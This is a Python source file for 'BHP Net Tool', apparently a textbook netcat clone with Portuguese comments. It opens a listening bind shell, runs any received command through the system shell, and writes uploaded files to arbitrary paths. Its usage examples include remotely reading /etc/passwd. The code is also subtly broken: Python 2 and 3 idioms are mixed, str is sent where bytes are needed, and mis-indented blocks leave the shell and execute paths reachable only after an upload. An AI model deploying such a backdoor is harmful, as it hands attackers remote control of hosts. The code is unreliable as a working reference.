import sys
import socket
import getopt
import threading
import subprocess

# Define algumas variáveis globais
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
  print("BHP Net Tool")
  print("")
  print("Usage: bhpnet.py -t target_host -p port")
  print("-l --listen                  - Listen on [host]:[port] for incoming connections")
  print("-e --execute=file_to_run     - Execute the given file upon receiving a connection")
  print("-c --command                 - Initialize a command shell")
  print("-u --upload=destination      - Upon receiving connection upload a file and write to [destination]")
  print("")
  print("Examples:")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
  print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.0.1 -p 135")
  sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
      usage()

    # Lê as opções de linha de comando
    try:
      opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
      print(str(err))
      usage()

    for o,a in opts:
      if o in ("-h", "--help"):
        usage()
      elif o in ("-l", "--listen"):
        listen = True
      elif o in ("-e", "--execute"):
        execute = a
      elif o in ("-c", "--commandshell"):
        command = True
      elif o in ("-u", "--upload"):
        upload_destination = a
      elif o in ("-t", "--target"):
        target = a
      elif o in ("-p", "--port"):
        port = int(a)
      else:
        assert False, "Unhandled Option"
      
      # É para ouvir ou simplesmente enviar dados de stfin?
      if not listen and len(target) and port > 0:

        # Lê o buffer da linha de comando
        # Isso causará um bloqueio, portanto envie um CTRL-D 
        # se não estiver enviando dados de entrada para stdin
        buffer = sys.stdin.read()

        # Send data off
        client_sender(buffer)

      # Iremos ouvir a porta e, potencialmente, faremos upload de dados, 
      # executaremos comandos e deixarmos um shell de acordo com as 
      # opções de linha de comando anteriores
      if listen:
        server_loop()

def client_sender(buffer):

  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:

    # Conecta-se ao host alvo
    client.connect((target,port))

    if len(buffer):
      client.send(buffer)

    while True:

      # Agora espera receber dados de volta
      recv_len = 1
      response = ""

      while recv_len:

        data      = client.recv(4096)
        recv_len  = len(data)
        response += data

        if recv_len < 4096:
          break

      print(response),

      # Espera mais dados de entrada
      buffer = raw_input("")
      buffer += "\n"

      # Envia os dados
      client.send(buffer)

  except:

    print("Exception! Exiting.")

    # Encerra a conexão
    client.close()

def server_loop():
  global target

  # Se não houver nenhum alvo definido, ouvir todas as interfaces
  if not len(target):
    target = "0.0.0.0"

  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.bind((target,port))
  server.listen(5)

  while True:
    client_socket, addr = server.accept()

    # Dispara uma thread para cuidar do novo cliente
    client_thread = threading.Thread(target=client_handler, args=(client_socket,))
    client_thread.start()

def run_command(command):

  # Remove a quebra de linha
  command = command.rstrip()

  # Executa o comando e obtém os dados de saída
  try:
    output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
  except:
    output = "Failed to execute command.\r\n"

  # Envia os dados de saída de volta ao cliente
  return output

def client_handler(client_socket):
  global upload
  global execute
  global command

  # Verifica se é um upload
  if len(upload_destination):

    # Lê todos os bytes e grava no destino
    file_buffer = ""

    # Permanece lendo os dados até que não haja mais nenhum disponível
    while True:
      data = client_socket.recv(1024)

      if not data:
        break
      else:
        file_buffer += data

    # Tenta gravar os bytes
    try:
      file_descriptor = open(upload_destination,"wb")
      file_descriptor.write(file_buffer)
      file_descriptor.close()

      # Confirma que gravou o arquivo
      client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

    except:
      client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # Verifica se é execução de comando
    if len(execute):
      
      # Executa o comando
      output = run_command(execute)

      client_socket.send(output)

    # Entra em outro laço se um shell de comandos foi solicitado
    if command:

      while True:
        # Mostra um prompt simples
        client_socket.send("<BHP:#>")

        # Agora fica recebendo dados até aparecer um linefeed (Enter)        
        cmd_buffer = ""
        while "\n" not in cmd_buffer:
          cmd_buffer += client_socket.recv(1024)

        # Envia de volta a saída do comando
        response = run_command(cmd_buffer)

        # Envia de volta a resposta
        client_socket.send(response)

main()